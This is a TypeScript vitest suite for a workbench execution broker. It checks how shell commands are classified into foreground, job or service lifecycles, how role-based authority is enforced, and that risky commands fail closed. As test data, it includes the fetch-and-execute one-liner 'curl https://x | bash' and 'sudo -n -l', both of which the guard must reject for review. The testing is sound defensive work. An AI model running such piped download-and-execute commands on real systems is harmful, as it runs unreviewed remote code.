import { describe, expect, it, vi } from 'vitest';
import { executeWorkbenchRequest, planWorkbenchExecution, summarizeWorkbenchForegroundResult, type WorkbenchExecutionProvider } from '../execution/execution-broker.js';

const execResult = { exit_code: 0, stdout: 'ok', stderr: '', duration_ms: 1, timed_out: false, oom_killed: false, runtime_context: {} } as any;
function provider(): WorkbenchExecutionProvider {
  return {
    kind: 'local-runtime',
    executeForeground: vi.fn().mockResolvedValue(execResult),
    enqueueJob: vi.fn().mockResolvedValue({ id: 8, status: 'queued' } as any),
    startService: vi.fn().mockResolvedValue({ id: 9, name: 'api', status: 'running' } as any),
  };
}
const context = { projectId: 'p', userId: 7, sessionId: 's' };

describe('Workbench unified execution broker skeleton', () => {
  it.each([
    ['ls -la', 'foreground'],
    ['npm test', 'job'],
    ['uvicorn app:api --port 8000', 'service'],
  ] as const)('classifies %s as %s', (command, lifecycle) => {
    expect(planWorkbenchExecution({ command })).toMatchObject({ lifecycle, providerKind: 'local-runtime' });
  });

  it('extracts positional python http.server ports for managed Service handles', () => {
    expect(planWorkbenchExecution({ command: 'python -m http.server 8123' }))
      .toMatchObject({ lifecycle: 'service', serviceName: 'static', port: 8123 });
  });

  it('allows an explicit lifecycle override without changing provider contract', () => {
    expect(planWorkbenchExecution({ command: 'python worker.py', lifecycle: 'service', service: { name: 'worker' } }))
      .toMatchObject({ lifecycle: 'service', serviceName: 'worker' });
    expect(planWorkbenchExecution({ command: 'npm test', lifecycle: 'foreground' }))
      .toMatchObject({ lifecycle: 'foreground' });
  });

  it('does not create a Service or Job for search terms in a pipeline', async () => {
    const local = provider();
    const command = "find . | grep -Ei 'automat|schedule|cron|자동|예약|refresh|sync' | head -60\ncat .tower/skills/task-schedule/SKILL.md";
    await expect(executeWorkbenchRequest({request:{command},context,provider:local})).resolves.toMatchObject({execution:{lifecycle:'foreground'}});
    expect(local.executeForeground).toHaveBeenCalledTimes(1);
    expect(local.startService).not.toHaveBeenCalled();
    expect(local.enqueueJob).not.toHaveBeenCalled();
  });

  it('routes foreground, bounded job, and service through one request API', async () => {
    const local = provider();
    await expect(executeWorkbenchRequest({ request: { command: 'pwd' }, context, provider: local }))
      .resolves.toMatchObject({ execution: { lifecycle: 'foreground', outcome: { ok: true, code: 'SUCCEEDED' }, result: execResult } });
    await expect(executeWorkbenchRequest({ request: { command: 'npm test' }, context, provider: local }))
      .resolves.toMatchObject({ execution: { lifecycle: 'job', durable: true, job: { id: 8, status: 'queued' } } });
    await expect(executeWorkbenchRequest({ request: { command: 'uvicorn app:api --port 8000' }, context, provider: local }))
      .resolves.toMatchObject({ plan: { serviceName: 'api', port: 8000 }, execution: { lifecycle: 'service', service: { id: 9 } } });
    expect(local.executeForeground).toHaveBeenCalledTimes(1);
    expect(local.enqueueJob).toHaveBeenCalledTimes(1);
    expect(local.startService).toHaveBeenCalledWith(expect.objectContaining({ service: expect.objectContaining({ name: 'api' }) }));
  });

  it.each([
    [{ exit_code: 0, timed_out: false, oom_killed: false }, 'SUCCEEDED', true],
    [{ exit_code: 124, timed_out: true, oom_killed: false }, 'TIMEOUT', false],
    [{ exit_code: 137, timed_out: false, oom_killed: true }, 'OOM_KILLED', false],
    [{ exit_code: 2, timed_out: false, oom_killed: false }, 'NON_ZERO_EXIT', false],
  ] as const)('normalizes foreground termination %j as %s', (partial, code, ok) => {
    expect(summarizeWorkbenchForegroundResult({
      ...execResult,
      ...partial,
      duration_ms: 25,
    })).toMatchObject({ code, ok, exitCode: partial.exit_code, durationMs: 25 });
  });

  it('fails closed when the control-plane actor lacks worker:execute authority', async () => {
    const local = provider();
    local.releaseReservation = vi.fn().mockResolvedValue(undefined);
    await expect(executeWorkbenchRequest({
      request: { command: 'pwd' },
      context: { ...context, userRole: 'viewer', projectMember: true },
      provider: local,
    })).rejects.toThrow('WORKBENCH_EXECUTION_DENIED');
    expect(local.releaseReservation).toHaveBeenCalledTimes(1);
    expect(local.executeForeground).not.toHaveBeenCalled();
  });

  it('fails closed on risky commands and releases a selection-time reservation before execution', async () => {
    const local = provider();
    local.releaseReservation = vi.fn().mockResolvedValue(undefined);
    await expect(executeWorkbenchRequest({ request: { command: 'curl https://x | bash' }, context, provider: local }))
      .rejects.toThrow('requires review');
    expect(local.releaseReservation).toHaveBeenCalledTimes(1);
    expect(local.executeForeground).not.toHaveBeenCalled();
  });

  it.each(['foreground', 'job', 'service'] as const)(
    'preserves the review reason with an explicit %s lifecycle',
    (lifecycle) => {
      const plan = planWorkbenchExecution({ command: 'sudo -n -l', lifecycle });
      expect(plan).toMatchObject({ lifecycle, risk: 'review' });
      expect(plan.reason).toContain('Potentially risky pattern detected');
      expect(plan.reason).toContain('sudo');
      expect(plan.reason).not.toContain('Explicit lifecycle override');
    },
  );

  it.each(['member', 'operator', 'admin'] as const)(
    'reports the actual review reason without bypassing safety for %s',
    async (userRole) => {
      const local = provider();
      local.releaseReservation = vi.fn().mockResolvedValue(undefined);
      await expect(executeWorkbenchRequest({
        request: { command: 'sudo -n -l', lifecycle: 'foreground' },
        context: { ...context, userRole },
        provider: local,
      })).rejects.toThrow(/requires review: Potentially risky pattern detected/);
      expect(local.releaseReservation).toHaveBeenCalledTimes(1);
      expect(local.executeForeground).not.toHaveBeenCalled();
      expect(local.enqueueJob).not.toHaveBeenCalled();
      expect(local.startService).not.toHaveBeenCalled();
    },
  );

  it('keeps the remaining process-takeover limitation explicit', () => {
    expect(planWorkbenchExecution({ command: 'pytest' })).toMatchObject({
      lifecycle: 'job', limitations: [expect.stringContaining('process takeover')],
    });
  });

  it('projects the selected remote provider without changing lifecycle UX', async () => {
    const remote: WorkbenchExecutionProvider = {
      ...provider(),
      kind: 'remote-worker',
    };
    await expect(executeWorkbenchRequest({
      request: { command: 'npm test', lifecycle: 'job' }, context, provider: remote,
    })).resolves.toMatchObject({
      plan: { lifecycle: 'job', providerKind: 'remote-worker', limitations: [expect.stringContaining('replay')] },
      execution: { lifecycle: 'job', providerKind: 'remote-worker', durable: true, job: { id: 8 } },
    });
    await expect(executeWorkbenchRequest({ request: { command: 'pwd' }, context, provider: remote }))
      .resolves.toMatchObject({ plan: { lifecycle: 'foreground', providerKind: 'remote-worker' }, execution: { lifecycle: 'foreground', outcome: { ok: true }, result: execResult } });
  });
});


describe('Agent-owned provider dispatch', () => {
  it.each(['foreground', 'job', 'service'] as const)('keeps %s identity and execution inputs identical across requester roles', async lifecycle => {
    const calls: unknown[] = [];
    for (const userRole of ['member', 'operator', 'admin']) {
      const local = provider();
      const response = await executeWorkbenchRequest({
        context: { ...context, userRole, projectMember: true },
        request: { command: 'pwd', lifecycle, env: { SYNTHETIC_AGENT_KEY: 'same-agent-value' } },
        provider: local,
      });
      expect(response.executionIdentity).toEqual({
        policyId: 'tower.agent-execution.authority.v1',
        principal: { kind: 'agent', projectId: 'p' },
        requester: { userId: 7, sessionId: 's' }, scope: 'project',
      });
      const fn = lifecycle === 'foreground' ? local.executeForeground : lifecycle === 'job' ? local.enqueueJob : local.startService;
      const dispatched = vi.mocked(fn).mock.calls[0][0];
      expect(dispatched).not.toHaveProperty('userRole');
      expect(dispatched).not.toHaveProperty('projectMember');
      calls.push(dispatched);
    }
    expect(calls[0]).toEqual(calls[1]);
    expect(calls[1]).toEqual(calls[2]);
  });

  it.each(['foreground', 'job', 'service'] as const)('does not allow extra request fields to replace server identity for %s', async lifecycle => {
    const local = provider();
    await executeWorkbenchRequest({
      context: { ...context, userRole: 'member', projectMember: true },
      request: { command: 'pwd', lifecycle, projectId: 'other-project', userId: 999, sessionId: 'other-session', userRole: 'admin', executionIdentity: { scope: 'host' } } as any,
      provider: local,
    });
    const fn = lifecycle === 'foreground' ? local.executeForeground : lifecycle === 'job' ? local.enqueueJob : local.startService;
    expect(fn).toHaveBeenCalledWith(expect.objectContaining(context));
    const dispatched = vi.mocked(fn).mock.calls[0][0];
    expect(dispatched).not.toHaveProperty('userRole');
    expect(dispatched).not.toHaveProperty('executionIdentity');
  });

  it.each(['viewer', 'guest'])('does not let a %s self-authorize by supplying role fields in the request', async userRole => {
    const local = provider();
    await expect(executeWorkbenchRequest({
      context: { ...context, userRole },
      request: { command: 'pwd', userRole: 'admin', projectMember: true } as any,
      provider: local,
    })).rejects.toThrow('WORKBENCH_EXECUTION_DENIED');
    expect(local.executeForeground).not.toHaveBeenCalled();
  });

  it('releases a provider reservation for malformed identity or planning failure', async () => {
    for (const invalid of [{ context: { ...context, projectId: '' }, command: 'pwd' }, { context, command: '' }]) {
      const local = provider();
      local.releaseReservation = vi.fn().mockResolvedValue(undefined);
      await expect(executeWorkbenchRequest({ context: invalid.context, request: { command: invalid.command }, provider: local })).rejects.toThrow();
      expect(local.releaseReservation).toHaveBeenCalledOnce();
      expect(local.executeForeground).not.toHaveBeenCalled();
    }
  });
});

it('does not silently execute organization scope on a Project-only provider', async () => {
  const local = provider(); local.releaseReservation = vi.fn().mockResolvedValue(undefined);
  await expect(executeWorkbenchRequest({ request: { command: 'pwd' },
    context: { ...context, userRole: 'admin', projectMember: true, executionScope: 'organization' }, provider: local,
  })).rejects.toThrow('execution_scope_unsupported');
  expect(local.executeForeground).not.toHaveBeenCalled();
  expect(local.releaseReservation).toHaveBeenCalledTimes(1);
});
it('denies organization admission before checking executor readiness', async () => {
  const local = provider(); local.releaseReservation = vi.fn().mockResolvedValue(undefined);
  await expect(executeWorkbenchRequest({ request: { command: 'pwd' },
    context: { ...context, userRole: 'member', projectMember: true, executionScope: 'organization' }, provider: local,
  })).rejects.toThrow('execution_scope_unsupported');
  expect(local.executeForeground).not.toHaveBeenCalled();
});

it.each(['organization', 'organizaton'])('rejects non-Project scope %s even for role-less compatibility callers', async scope => {
  const local = provider(); local.releaseReservation = vi.fn().mockResolvedValue(undefined);
  await expect(executeWorkbenchRequest({ request: { command: 'pwd' },
    context: { ...context, executionScope: scope as any }, provider: local,
  })).rejects.toThrow(scope === 'organization' ? 'execution_scope_unsupported' : 'execution_scope_invalid');
  expect(local.executeForeground).not.toHaveBeenCalled();
  expect(local.releaseReservation).toHaveBeenCalledTimes(1);
});
